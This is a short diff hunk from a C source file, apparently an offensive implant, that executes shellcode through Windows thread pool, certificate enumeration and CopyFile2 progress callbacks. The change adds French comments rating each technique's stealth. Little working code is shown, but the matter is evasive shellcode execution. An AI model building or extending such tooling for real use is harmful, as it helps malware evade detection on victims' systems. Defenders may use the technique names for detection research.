@@ -1459,7 +1459,8 @@ BOOL Injection_ListThreads(DWORD targetPid, char** outJson) {
 
 /*
  * Exécution via Thread Pool (TpAllocWork)
- * Le shellcode est exécuté par le thread pool system
+ * Le shellcode est exécuté par le thread pool système
+ * Niveau furtivité: ÉLEVÉ
  */
 typedef NTSTATUS (NTAPI *pTpAllocWork)(PTP_WORK* WorkReturn, PTP_WORK_CALLBACK Callback,
                                        PVOID Context, PTP_CALLBACK_ENVIRON CallbackEnviron);
@@ -1629,6 +1630,7 @@ BOOL Injection_CertEnumCallback(BYTE* shellcode, DWORD shellcodeSize) {
 /*
  * Exécution via CopyFile2 progress callback
  * Technique peu connue utilisant les callbacks de copie de fichier
+ * Niveau furtivité: TRÈS ÉLEVÉ
  */
 BOOL Injection_CopyFileCallback(BYTE* shellcode, DWORD shellcodeSize) {
     if (!shellcode || shellcodeSize == 0) return FALSE;
